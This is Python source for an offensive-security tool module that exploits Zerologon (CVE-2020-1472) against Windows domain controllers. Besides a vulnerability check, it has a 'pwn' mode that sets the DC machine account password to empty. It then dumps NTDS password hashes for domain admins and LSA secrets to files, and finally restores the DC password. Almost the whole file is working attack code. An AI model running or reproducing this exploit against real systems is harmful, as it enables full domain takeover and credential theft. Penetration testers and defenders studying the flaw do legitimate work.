#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# everything is comming from https://github.com/dirkjanm/CVE-2020-1472
# credit to @dirkjanm
# module by : @mpgn_x64

from binascii import unhexlify
from struct import pack, unpack

from impacket.ldap import ldap
from impacket.smbconnection import SMBConnection
from impacket.examples.secretsdump import RemoteOperations, NTDSHashes, LSASecrets
from impacket.dcerpc.v5 import nrpc, epm, transport
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5.nrpc import NetrServerPasswordSet2Response, NetrServerPasswordSet2

# Give up brute-forcing after this many attempts. If vulnerable, 256 attempts are expected to be necessary on average.
MAX_ATTEMPTS = 2000  # False negative chance: 0.04%


class NXCModule:
    name = "zerologon"
    description = "Module to check if the DC is vulnerable to Zerologon aka CVE-2020-1472"
    supported_protocols = ["smb", "wmi"]
    opsec_safe = True
    multiple_hosts = False

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options

    def options(self, context, module_options):
        """
        netexec smb DC-IP -u username -p password -M zerologon
        netexec smb DC-IP -u username -p password -M zerologon -o mode=pwn
        """
        self.__pwn = False
        self.__vuln = False

        if module_options:
            if "pwn" in module_options['MODE']:
                self.__pwn = True

    def on_login(self, context, connection):
        self.logger = context.log

        zerologon_exp = ZeroLogonExp(self.logger, connection)
        if zerologon_exp.perform_attack():
            self.__vuln = True
            if self.__pwn is False:
                self.logger.success("Try module option '-o mode=pwn' to attack target")
            try:
                host = self.context.db.get_hosts(connection.host)[0]
                self.context.db.add_host(
                    host.ip,
                    host.hostname,
                    host.domain,
                    host.os,
                    host.smbv1,
                    host.signing,
                    zerologon=True,
                )
            except Exception as e:
                self.logger.debug(f"Error updating zerologon status in database")

        if self.__pwn == True and self.__vuln == True:
            username = None

            zerologon_exp.perform_attack(pwn_flag=True)

            secretsdump = secretsdump_nano(self.logger, connection)
            try:
                username, nthash = secretsdump.ntdsdump_blankpass()
            except Exception as e:
                if not username:
                    self.logger.fail("All domain admins account has smb login issues, add '--debug' to get more details.")
                else:
                    self.logger.fail(str(e))
                return
            else:
                hexpass = secretsdump.LSADump(username=username, nthash=nthash)

                action = ChangeMachinePassword(password=unhexlify(hexpass.strip("\r\n")), connection=connection, logger=self.logger)
                action.restore_DCPass()

class ZeroLogonExp():
    def __init__(self, logger, connection):
        self.__dc_handle =  f"\\\\{connection.hostname}"
        self.__target_computer = connection.hostname
        self.__dc_ip = connection.host
        self.logger = logger
    
    def perform_attack(self, pwn_flag=False):
        binding = epm.hept_map(self.__dc_ip, nrpc.MSRPC_UUID_NRPC, protocol="ncacn_ip_tcp")
        dce = transport.DCERPCTransportFactory(binding).get_dce_rpc()
        dce.connect()
        dce.bind(nrpc.MSRPC_UUID_NRPC)
        if not pwn_flag:
            # Keep authenticating until successful. Expected average number of attempts needed: 256.
            self.logger.display("Check mode: Performing authentication attempts...")
            try:
                for attempt in range(0, MAX_ATTEMPTS):
                    result = self.try_zero_authenticate(dce)
                    if result:
                        self.logger.highlight("VULNERABLE")
                        return True
                else:
                    self.logger.highlight("Attack failed, target is probably not vulnerable.")
            except DCERPCException as e:
                self.logger.fail(f"Error while connecting to host, DCERPCException: {str(e)}, which means this is probably not a DC!")
        else:
            self.logger.display('PWN mode, changing DC account password to empty string')
            result = None
            for attempt in range(0, MAX_ATTEMPTS):
                try:
                    result = self.zerologon_exploit(dce)
                except nrpc.DCERPCSessionError as ex:
                    # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
                    if ex.get_error_code() == 0xc0000022:
                        pass
                    else:
                        self.logger.fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
                except BaseException as ex:
                    self.logger.fail(f'Unexpected error: {ex}.')
                
                if result is None:
                    self.logger.debug("Pwning...")
                else:
                    break

            if result['ErrorCode'] == 0:
                self.logger.highlight('Exploit complete!')
            else:
                self.logger.fail('Non-zero return code, something went wrong?')

    def try_zero_authenticate(self, dce):
        # Connect to the DC's Netlogon service.
        # Use an all-zero challenge and credential.
        plaintext = b"\x00" * 8
        ciphertext = b"\x00" * 8

        # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled.
        flags = 0x212FFFFF

        # Send challenge and authentication request.
        nrpc.hNetrServerReqChallenge(dce, self.__dc_handle + "\x00", self.__target_computer + "\x00", plaintext)
        try:
            server_auth = nrpc.hNetrServerAuthenticate3(
                dce,
                self.__dc_handle + "\x00",
                self.__target_computer + "$\x00",
                nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
                self.__target_computer + "\x00",
                ciphertext,
                flags,
            )

            # It worked!
            assert server_auth["ErrorCode"] == 0
            return True

        except nrpc.DCERPCSessionError as ex:
            # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
            if ex.get_error_code() == 0xC0000022:
                return None
            else:
                self.logger.fail(f"Unexpected error code from DC: {ex.get_error_code()}.")
        except BaseException as ex:
            self.logger.fail(f"Unexpected error: {str(ex)}.")
    
    def zerologon_exploit(self, dce):
        request = nrpc.NetrServerPasswordSet2()
        request['PrimaryName'] = self.__dc_handle + '\x00'
        request['AccountName'] = self.__target_computer + '$\x00'
        request['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
        authenticator = nrpc.NETLOGON_AUTHENTICATOR()
        authenticator['Credential'] = b'\x00' * 8
        authenticator['Timestamp'] = 0
        request['Authenticator'] = authenticator
        request['ComputerName'] = self.__target_computer + '\x00'
        request['ClearNewPassword'] = b'\x00' * 516
        return dce.request(request)
    
class secretsdump_nano():
    def __init__(self, logger, connection):
        self.__remoteName = connection.host
        self.__remoteHost = connection.host
        self.__kdcHost = connection.kdcHost
        self.__dcName = f"{connection.hostname}$"
        self.__domain = connection.domain
        self.__outputFileName=connection.output_filename
        self.__hexpass = ""
        self.logger = logger

        domainParts = self.__domain.split('.')
        baseDN = ''
        for i in domainParts:
            baseDN += 'dc=%s,' % i
        # Remove last ','
        self.__baseDN = baseDN[:-1]

    def ntdsdump_blankpass(self):
        
        creds = []
        def add_ntds_hash(ntds_hash):
            creds.append(ntds_hash.split(" ")[0])
            self.logger.highlight(ntds_hash.split(" ")[0])
        
        # Initialize LDAP Connection
        if self.__kdcHost is None:
            self.__kdcHost = self.__remoteHost

        ldapConnection = ldap.LDAPConnection(f"ldap://{self.__domain}", self.__baseDN, self.__kdcHost)
        ldapConnection.login(self.__dcName, '', self.__domain, '', '')
        search_filter = f"(&(|(memberof=CN=Domain Admins,CN=Users,{self.__baseDN})(memberof=CN=Enterprise Admins,CN=Users,{self.__baseDN}))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"

        # Initialize smb connection for get into DRSUAPI method
        smb_connection = SMBConnection(self.__remoteName, self.__remoteHost)
        # Blank password, lm & nt hashes
        smb_connection.login(self.__dcName, '', self.__domain, '', '')

        # Initialize remoteoperations
        #outputFileName = "{}_{}_domain_admins".format(self.dcName, self.remoteHost)
        remoteOps  = RemoteOperations(smbConnection=smb_connection, doKerberos=False, kdcHost=self.__kdcHost, ldapConnection=ldapConnection)
        nh = NTDSHashes(
            None,
            None,
            isRemote=True,
            history=False,
            noLMHash=False,
            remoteOps=remoteOps,
            useVSSMethod=False,
            justNTLM=True,
            pwdLastSet=False,
            resumeSession=None,
            outputFileName=self.__outputFileName,
            justUser=None,
            ldapFilter=search_filter,
            printUserStatus=False,
            perSecretCallback=lambda secret_type, secret: add_ntds_hash(secret),
        )
        
        self.logger.success(f'Dumping all domain admins creds to file {self.__outputFileName}.ntds')
        nh.dump()
        # Domain admin to extra lsa secret to get DC history password (plain_password_hex)
        # Return all domain admins cred, for some reason, maybe some user creds are unavailable like PASSWORD_EXPIRED.
        nh.finish()
        return self.verify_creds(creds)
    
    def verify_creds(self, creds):
        for i in creds:
            username = i.split(":")[0]
            if "\\" in username:
                username = username.split("\\")[1]

            nthash = i.split(":")[3]
            try:
                smb_connection = SMBConnection(self.__remoteName, self.__remoteHost)
                smb_connection.login(username, '', self.__domain, '', nthash)
            except Exception as e:
                self.logger.info(f"Domain admin: {username} unavailable, reason: {str(e)}")
                pass
            else:
                self.logger.display(f'Use domain admin: "{username}" to get DC hex password and restore DC nthash')
                return username, nthash
    
    def LSADump(self, username, nthash):
        def add_lsa_secret(secret):
            if "plain_password_hex" in secret:
                self.__hexpass = secret.split(":")[2]
                self.logger.success(f"Dumping DC hex password")
                self.logger.highlight(self.__hexpass)
        
        smb_connection = SMBConnection(self.__remoteName, self.__remoteHost)
        smb_connection.login(username, '', self.__domain, '', nthash)
        remoteOps  = RemoteOperations(smb_connection, False)
        
        #remoteOps.setExecMethod("smbexec")
        remoteOps.enableRegistry()
        bootKey = remoteOps.getBootKey()
        SECURITYFileName = remoteOps.saveSECURITY()
        LSASecret = LSASecrets(
                    SECURITYFileName,
                    bootKey,
                    remoteOps,
                    True,
                    False,
                    perSecretCallback=lambda secret_type, secret: add_lsa_secret(secret),
                    )
        LSASecret.dumpSecrets()
        LSASecret.exportSecrets(self.__outputFileName)

        self.logger.success(f"Dumped LSA secrets to {self.__outputFileName}.secrets")

        LSASecret.finish()
        return self.__hexpass
    
class ChangeMachinePassword:
    KNOWN_PROTOCOLS = {
        135: {'bindstr': r'ncacn_ip_tcp:%s',           'set_host': False},
        139: {'bindstr': r'ncacn_np:%s[\PIPE\netlogon]', 'set_host': True},
        445: {'bindstr': r'ncacn_np:%s[\PIPE\netlogon]', 'set_host': True},
        }

    def __init__(self, password, connection, logger):
        self.__password = password
        self.__remoteName = connection.hostname
        self.__remoteHost = connection.host
        self.logger = logger

    def restore_DCPass(self):
        stringbinding = epm.hept_map(self.__remoteHost, nrpc.MSRPC_UUID_NRPC, protocol = 'ncacn_ip_tcp')
        self.logger.info('StringBinding %s'%stringbinding)
        rpctransport = transport.DCERPCTransportFactory(stringbinding)
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(nrpc.MSRPC_UUID_NRPC)

        resp = nrpc.hNetrServerReqChallenge(dce, NULL, self.__remoteName + '\x00', b'12345678')
        serverChallenge = resp['ServerChallenge']

        # Empty at this point
        self.sessionKey = nrpc.ComputeSessionKeyAES('', b'12345678', serverChallenge)

        self.ppp = nrpc.ComputeNetlogonCredentialAES(b'12345678', self.sessionKey)

        try:
            resp = nrpc.hNetrServerAuthenticate3(dce, '\\\\' + self.__remoteName + '\x00', self.__remoteName + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,self.__remoteName + '\x00',self.ppp, 0x212fffff )
        except Exception as e:
            if str(e).find('STATUS_DOWNGRADE_DETECTED') < 0:
                raise
        self.clientStoredCredential = pack('<Q', unpack('<Q',self.ppp)[0] + 10)

        request = NetrServerPasswordSet2()
        request['PrimaryName'] = '\\\\' + self.__remoteName + '\x00'
        request['AccountName'] = self.__remoteName + '$\x00'
        request['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
        request['Authenticator'] = self.update_authenticator()
        request['ComputerName'] = self.__remoteName + '\x00'
        encpassword = nrpc.ComputeNetlogonCredentialAES(self.__password, self.sessionKey)
        indata = b'\x00' * (512-len(self.__password)) + self.__password + pack('<L', len(self.__password))
        request['ClearNewPassword'] = nrpc.ComputeNetlogonCredentialAES(indata, self.sessionKey)
        result = dce.request(request)
        self.logger.success('Restore DC with hex password successfully.')

    def update_authenticator(self, plus=10):
        authenticator = nrpc.NETLOGON_AUTHENTICATOR()
        authenticator['Credential'] = nrpc.ComputeNetlogonCredentialAES(self.clientStoredCredential, self.sessionKey)
        authenticator['Timestamp'] = plus
        return authenticator